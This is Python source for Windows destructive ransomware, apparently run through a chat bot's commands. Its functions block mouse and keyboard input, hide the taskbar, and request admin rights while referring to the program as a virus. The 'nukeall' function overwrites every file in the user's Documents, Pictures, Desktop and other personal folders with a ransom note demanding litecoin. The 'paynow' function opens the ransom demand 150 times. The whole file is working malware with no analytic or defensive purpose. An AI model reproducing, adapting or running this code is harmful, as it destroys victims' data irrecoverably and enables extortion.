import ctypes,threading,os;import winreg as reg;import queue;import subprocess,webbrowser,asyncio,platform,sys
async def nomouse(ctx, action):
 try:
  if action == "start":
   ctypes.windll.user32.BlockInput(True)
   await ctx.send("Mouse and keyboard input have been blocked.")
  elif action == "stop":
   ctypes.windll.user32.BlockInput(False)
   await ctx.send("Mouse and keyboard input have been unblocked.")
  else:
   await ctx.send("Invalid action. Use 'start' to block or 'stop' to unblock.")
 except Exception as e:
  await ctx.send(f"Error: {e}")

async def taskbar(ctx, action):
 try:
  hwnd_taskbar = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
  if action == "hide":
   ctypes.windll.user32.ShowWindow(hwnd_taskbar, 0)
   await ctx.send("Taskbar hidden.")
  elif action == "show":
   ctypes.windll.user32.ShowWindow(hwnd_taskbar, 5)
   await ctx.send("Taskbar shown.")
  else:
   await ctx.send("Invalid argument. Use 'hide' or 'show'.")
 except Exception as e:
  await ctx.send(f"Error: {e}")

async def nukeall(ctx):
 def process_file(p):
  attempts = 0
  while attempts < 3:
   try:
    if p.endswith('.openme'): return
    with open(p, 'w') as f:
     f.write("hello if you are wondering what happened here, it is because it is locked. in order to unlock this file and the rest of ur pc? you must pay 100 us dollars in litecoin to the address: LaHL1jGMk2VUgn6c4QtFVLi7BjycWrQorB")
    new_p = os.path.splitext(p)[0] + '.openme'
    os.rename(p, new_p)
    set_default_app(new_p)
    return
   except: attempts += 1

 def set_default_app(file_path):
  try:
   key = r"Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.openme\UserChoice"
   reg.CreateKey(reg.HKEY_CURRENT_USER, key)
   with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_WRITE) as hkey:
    reg.SetValueEx(hkey, "Progid", 0, reg.REG_SZ, "txtfile")
  except: pass

 def worker():
  while not file_queue.empty():
   file = file_queue.get()
   process_file(file)
   file_queue.task_done()

 directories = [
  os.path.expanduser('~') + "\\Downloads",
  os.path.expanduser('~') + "\\Documents",
  os.path.expanduser('~') + "\\Pictures",
  os.path.expanduser('~') + "\\Videos",
  os.path.expanduser('~') + "\\Desktop",
  os.path.expanduser('~') + "\\Favorites",
  os.path.expanduser('~') + "\\Links",
  os.path.expanduser('~') + "\\Saved Games",
  os.path.expanduser('~') + "\\Searches"
 ]
 file_queue = queue.Queue()
 for _ in range(5):
  for directory in directories:
   for r, d1, f in os.walk(directory, topdown=False):
    for fi in f:
     file_queue.put(os.path.join(r, fi))
 threads = []
 for _ in range(5):
  t = threading.Thread(target=worker)
  t.start()
  threads.append(t)

 for t in threads:
  t.join()
 set_default_app(None)

 await ctx.send("all files nuked!")
async def paynow(ctx):
    try:
        username = subprocess.check_output("whoami").decode().strip()
        file_path = os.path.expanduser('~') + "\\Documents\\10101.txt"
        with open(file_path, 'w') as f:
            f.write(f"PAY 100 USD IN LITECOIN TO ADDRESS LaHL1jGMk2VUgn6c4QtFVLi7BjycWrQorB WITHIN 6 MINUTES, OR YOUR PC GOES BYE BYE\nYOU CAN BUY LITECOIN AT https://bitpay.com/buy-litecoin/\nGOOD LUCK {username}!!!")
        for _ in range(150):
            subprocess.Popen(['notepad.exe', file_path])
            subprocess.run('nircmd win maximize ititle "10101.txt"', shell=True)
        await ctx.send("Ransom message showed")
    except Exception as e:
        return
async def admin(ctx):
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            await ctx.send("virus already has admin perms")
            return

        script = sys.argv[0]
        params = " ".join(sys.argv[1:])
        command = f"python {script} {params}"

        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, command, None, 1)
        sys.exit()

    except Exception as e:
        await ctx.send(f"Error: {e}")